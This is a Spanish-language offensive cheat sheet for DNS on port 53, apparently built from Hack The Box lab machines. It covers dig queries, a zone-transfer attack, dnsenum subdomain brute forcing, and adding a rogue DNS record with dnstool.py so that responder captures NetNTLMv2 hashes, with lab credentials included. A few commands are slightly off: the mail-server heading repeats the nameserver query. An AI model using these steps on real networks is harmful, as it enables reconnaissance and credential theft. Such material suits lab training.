# DNS - 53

## Uso de dig

### Consulta DNS Simple
```null
dig @10.10.10.192 blackfield.local
```

### Enumeración nameservers

```null
dig @10.10.10.192 blackfield.local ns
```

### Enumeración servidores de correo
```null
dig @10.10.10.192 blackfield.local ns
```

### Ataque de transferencia de zona
```null
dig axfr @10.10.10.192 blackfield.local
```

## Uso de dnsenum

### Fuzzing de directorios

```null
dnsenum --dnsserver 10.10.10.224 --threads 30 -f /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt realcorp.htb
```

### Abuso DNS Records

En el siguiente ejemplo se muestra un script de PowerShell que itera por dominios que empiezan por ``web`` seguido de un wildcard (*)

```null
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

Es posible crear un nuevo DNS Record para que apunte al equipo atacante y recibir la petición y con herramientas como ```responder``` obtener un hash NetNTLMv2

```null
python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -r webrubbx -a add -t A -d 10.10.16.6 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

